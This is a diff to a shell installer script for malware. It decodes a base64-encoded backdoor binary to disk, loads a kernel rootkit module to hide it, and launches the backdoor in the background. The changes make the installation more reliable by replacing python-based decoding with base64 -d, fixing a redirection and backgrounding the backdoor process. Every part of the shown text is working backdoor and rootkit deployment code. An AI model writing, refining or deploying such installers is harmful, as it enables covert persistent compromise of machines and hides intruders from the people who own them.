@@ -14,13 +14,9 @@ else
 fi
 
 # Create backdoor file
-cmd="'import base64;f=open(\"$backdoor_path\",\"wb\");f.write(base64.b64decode(\"$backdoor_bin\"));f.close()'"
-python_cmd="python -c $cmd"
-eval "$python_cmd"
-
-if [ "$?" != 0 ]; then
-    echo "Error creating $backdoor_path"
-fi
+echo $backdoor_bin > bin.txt
+base64 -d bin.txt > $backdoor_path
+rm bin.txt
 chmod 700 $backdoor_path
 
 # Create rootkit file
@@ -47,7 +43,7 @@ start_rootkit() {
         echo "\$lkm_path does not exist!"
     fi
     # enable hiding of the backdoor
-    insmod \$lkm_path > /dev/null > > /dev/null 2>&1
+    insmod \$lkm_path > /dev/null 2>&1
 }
 
 start_backoor() {
@@ -56,7 +52,7 @@ start_backoor() {
     fi
 
     #launch the backdoor
-    eval \$bd_path
+    \$bd_path &
 }
 
 stop_rootkit() {
